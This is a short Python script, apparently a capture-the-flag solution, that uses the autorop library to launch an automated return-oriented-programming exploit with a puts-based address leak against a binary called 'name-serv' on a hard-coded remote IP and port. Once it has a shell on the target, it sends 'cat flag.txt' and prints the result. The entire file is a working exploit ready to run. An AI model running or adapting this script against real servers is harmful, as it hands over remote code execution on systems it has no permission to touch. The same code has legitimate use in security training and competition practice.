from autorop import *
local = True
host = '3.97.113.25'
port = 9001
i = 0
elf = f'./{"name-serv"}'
try:
    s = PwnState(elf, lambda: remote(f'{host}',port))
    pipeline = turnkey.Classic(leak=leak.Puts())
    r = pipeline(s)
    print(f'got: {r.target.recv()}')
    r.target.sendline(b'cat flag.txt')
    flag = r.target.recv().decode()
    print(f'\nflag: {flag}')
except Exception as e:
    print(f'Exception: {e}')

